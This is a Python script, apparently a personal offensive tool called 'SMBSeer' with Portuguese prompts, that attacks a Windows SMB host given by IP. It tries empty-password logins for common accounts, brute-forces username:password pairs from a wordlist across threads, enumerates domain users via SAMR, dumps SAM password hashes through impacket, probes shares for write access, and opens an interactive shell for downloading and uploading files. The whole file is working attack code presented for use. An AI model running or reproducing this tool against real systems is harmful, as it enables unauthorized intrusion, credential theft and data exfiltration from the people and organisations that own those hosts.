import threading
import io
import os
import readline
from impacket.smbconnection import SMBConnection
from concurrent.futures import ThreadPoolExecutor, as_completed
from impacket.dcerpc.v5 import samr, transport
from impacket.examples.secretsdump import RemoteOperations, SAMHashes

os.system("clear")

print("""\033[1;36m
 _____ _____ _____ _____             
|   __|     | __  |   __|___ ___ ___ 
|__   | | | | __ -|__   | -_| -_|  _|
|_____|_|_|_|_____|_____|___|___|_|  \033[m
    Author: Nanoxsec
    Instagram: @eulucas.97
""")

TARGET = input("[*] TARGET IP: ").strip()
PORT = 445
THREADS = int(input("[*] Número de threads: ").strip())

WORDLIST = "wordlist.txt"
lock = threading.Lock()
empty_password_works = False


def setup_autocomplete(commands):
    def completer(text, state):
        options = [cmd for cmd in commands if cmd.startswith(text)]
        return options[state] if state < len(options) else None

    readline.parse_and_bind("tab: complete")
    readline.set_completer(completer)


def format_size(size):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024:
            return f"{size:.1f} {unit}"
        size /= 1024
    return f"{size:.1f} TB"


def normalize_smb_path(path, file):
    if path == "\\":
        return file
    if path.endswith("\\"):
        return path + file
    return path + "\\" + file


def enum_users(target, username, password):
    try:
        print("[*] Enumerando usuários via SAMR...")

        rpctransport = transport.SMBTransport(
            target, 445, r'\samr',
            username=username, password=password
        )

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        resp = samr.hSamrConnect(dce)
        serverHandle = resp['ServerHandle']

        domains = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)['Buffer']['Buffer']
        domain = domains[0]['Name']

        domainId = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain)['DomainId']
        domainHandle = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=domainId)['DomainHandle']

        users = samr.hSamrEnumerateUsersInDomain(dce, domainHandle)['Buffer']['Buffer']

        for user in users:
            print(f"[+] USER: {user['Name']}")

        dce.disconnect()

    except:
        print("[-] Falha ao enumerar usuários")


def dump_sam(conn, username, password):
    try:
        print("[*] Tentando dump de SAM...")

        remoteOps = RemoteOperations(conn, False)
        remoteOps.enableRegistry()

        samFileName = remoteOps.saveSAM()
        systemFileName = remoteOps.saveSYSTEM()

        samHashes = SAMHashes(samFileName, systemFileName, isRemote=True)
        samHashes.dump()

        samHashes.finish()
        remoteOps.finish()

    except:
        print("[-] usuário com pouco privilégio para isso!")


def listar_shares(conn, user):
    all_shares = []

    print(f"\n[+] Shares para {user}:")

    try:
        shares = conn.listShares()

        for idx, share in enumerate(shares):
            name = share['shi1_netname'][:-1]

            read_access = False
            write_access = False

            try:
                conn.listPath(name, '*')
                read_access = True
            except:
                pass

            try:
                file_data = io.BytesIO(b"a")
                conn.putFile(name, "test.txt", file_data.read)
                write_access = True

                try:
                    conn.deleteFile(name, "test.txt")
                except:
                    pass
            except:
                pass

            if read_access and write_access:
                perms = "\033[1;32mREAD/WRITE\033[m"
            elif read_access:
                perms = "\033[1;33mREAD\033[m"
            elif write_access:
                perms = "\033[1;36mWRITE\033[m"
            else:
                perms = "\033[1;31mNO ACCESS\033[m"

            print(f"  [{idx}] {name} -> {perms}")

            all_shares.append(name)

    except:
        print("[-] Erro ao listar shares")

    return all_shares


def smb_shell(conn, user):
    try:
        accessible = listar_shares(conn, user)

        if not accessible:
            return

        while True:
            choice = input("\n[?] Escolha o share: ").strip()
            if not choice.isdigit():
                print("[-] Entrada inválida")
                continue

            choice = int(choice)
            if 0 <= choice < len(accessible):
                share = accessible[choice]
                break
            else:
                print("[-] Fora do intervalo")

        setup_autocomplete(["ls", "cd", "pwd", "download", "upload", "exit", "quit", "sair"])

        path = "\\"

        while True:
            cmd = input(f"smb:{share}{path}> ").strip()

            if cmd in ["exit", "quit", "sair"]:
                print("\n[?] Deseja trocar de diretório (S) ou sair (N)?")
                while True:
                    opt = input(">> ").strip().lower()

                    if opt == "n":
                        os._exit(0)

                    elif opt == "s":
                        accessible = listar_shares(conn, user)
                        if not accessible:
                            os._exit(0)

                        while True:
                            choice = input("\n[?] Escolha o novo share: ").strip()

                            if not choice.isdigit():
                                print("[-] Entrada inválida")
                                continue

                            choice = int(choice)
                            if 0 <= choice < len(accessible):
                                share = accessible[choice]
                                path = "\\"
                                break
                            else:
                                print("[-] Fora do intervalo")
                        break
                    else:
                        print("[-] Opção inválida")
                continue

            if cmd == "pwd":
                print(path)
                continue

            if cmd == "ls":
                try:
                    files = conn.listPath(share, path + '*')
                    dirs, regs = [], []

                    for f in files:
                        name = f.get_longname()
                        if name in [".", ".."]:
                            continue
                        if f.is_directory():
                            dirs.append(name)
                        else:
                            regs.append((name, f.get_filesize()))

                    for d in sorted(dirs):
                        print(f"D {d}/")

                    for n, s in sorted(regs):
                        print(f"A {n} ({format_size(s)})")

                except:
                    print("[-] Erro ao listar")
                continue

            if cmd.startswith("cd "):
                new_path_input = cmd[3:].strip()
                parts = new_path_input.replace("/", "\\").split("\\")

                temp_path = path

                for part in parts:
                    if part in ["", "."]:
                        continue
                    elif part == "..":
                        if temp_path != "\\":
                            temp_path = "\\".join(temp_path.rstrip("\\").split("\\")[:-1]) + "\\"
                            if temp_path == "":
                                temp_path = "\\"
                    else:
                        test_path = temp_path + part + "\\"
                        try:
                            conn.listPath(share, test_path + "*")
                            temp_path = test_path
                        except:
                            print(f"[-] Diretório inválido: {part}")
                            temp_path = path
                            break

                path = temp_path
                continue

            if cmd == "download":
                file = input("Arquivo: ").strip()

                try:
                    file_obj = io.BytesIO()
                    conn.getFile(share, file, file_obj.write)

                    data = file_obj.getvalue()

                    if len(data) == 0:
                        print("[-] Arquivo vazio ou não acessível")
                        continue

                    with open(file, "wb") as f:
                        f.write(data)

                    print(f"[+] Download OK -> {file} ({len(data)} bytes)")

                except Exception as e:
                    print(f"[-] Falha no download: {str(e)}")
                continue

            if cmd == "upload":
                file = input("Arquivo local: ")
                if not os.path.exists(file):
                    print("[-] Não existe")
                    continue

                try:
                    with open(file, "rb") as f:
                        conn.putFile(share, path + os.path.basename(file), f.read)
                    print("[+] Upload OK")
                except:
                    print("[-] Sem permissão")
                continue

    except:
        pass


def try_login(user, password):
    try:
        conn = SMBConnection(TARGET, TARGET, sess_port=PORT, timeout=3)
        conn.login(user, password, "")

        with lock:
            print(f"[+] SUCESSO -> {user}:{password if password else 'EMPTY'}")

        enum_users(TARGET, user, password)
        dump_sam(conn, user, password)

        conn.logoff()
        return True

    except:
        return False


def detect_empty_password():
    global empty_password_works

    print("[*] Testando suporte a senha vazia...")

    for user in ["guest", "administrator", "admin", "user"]:
        try:
            conn = SMBConnection(TARGET, TARGET, sess_port=PORT, timeout=3)
            conn.login(user, "")

            print(f"[+] Senha vazia funciona: {user}")
            empty_password_works = True

            listar_shares(conn, user)

            while True:
                escolha = input("[?] Deseja continuar (S), sair (N) ou shell: ").strip().lower()

                if escolha == "n":
                    os._exit(0)
                elif escolha == "s":
                    conn.logoff()
                    return
                elif escolha == "shell":
                    smb_shell(conn, user)
                    os._exit(0)
                else:
                    print("[-] Opção inválida")

        except:
            continue


def worker(user, password):
    try:
        try_login(user, password)
    except:
        pass


def main():
    try:
        detect_empty_password()

        tasks = []

        with open(WORDLIST) as f:
            for line in f:
                if ":" in line:
                    u, p = line.strip().split(":", 1)
                    tasks.append((u, p))

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(worker, u, p) for u, p in tasks]

            for _ in as_completed(futures):
                pass

    except KeyboardInterrupt:
        os._exit(0)


if __name__ == "__main__":
    main()
